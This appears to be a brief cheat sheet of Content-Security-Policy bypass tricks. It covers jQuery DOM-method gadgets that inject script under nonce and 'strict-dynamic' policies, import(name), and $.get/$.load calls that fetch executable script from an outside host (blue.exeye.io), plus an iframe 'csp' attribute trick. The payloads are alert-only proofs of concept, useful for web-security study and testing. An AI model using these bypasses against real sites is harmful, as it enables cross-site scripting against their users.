### CSP Fun Tricks
#### JQuery Gadget

    header("Content-Security-Policy: script-src 'self' 'unsafe-inline';");
    header("Content-Security-Policy: default-src 'none'; script-src 'nonce-secret' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; media-src 'self'; font-src 'self' data:; connect-src 'self'; base-uri 'none';");
    

 ```javascript
<script nonce=secret>
       .html,
       .after,
       .before,
       .append,
       .prepend,
       // $("body").html('<script>alert``') || $("body").html(name)
       
       wrap,
       wrapAll,
       replaceWith,
       // $("body").wrap('<script>alert``</script>') || $("body").wrap(name)
       
       import(name),
       
       not set connect-src
       
       $.get(`https://blue.exeye.io/alert`)             // Content-Type=text/javascript CORS = *
	   $.ajax(`https://blue.exeye.io/alert`);           // Content-Type=text/javascript CORS = *
	   $.post(`https://blue.exeye.io/alert`);           // Content-Type=text/javascript CORS = *
	   $('body').load(`https://blue.exeye.io/html`);    // Content-Type: text/html 	CORS = *
</script>
 ```
 
 
 #### csp-embedded-enforcement
 
 ```html
<iframe src="/block_request" csp="script-src https://blue.exeye.io" />

<!-- precondition=  same origin && iframe-csp not overwrite csp(http-header-csp meta-csp )-->

```
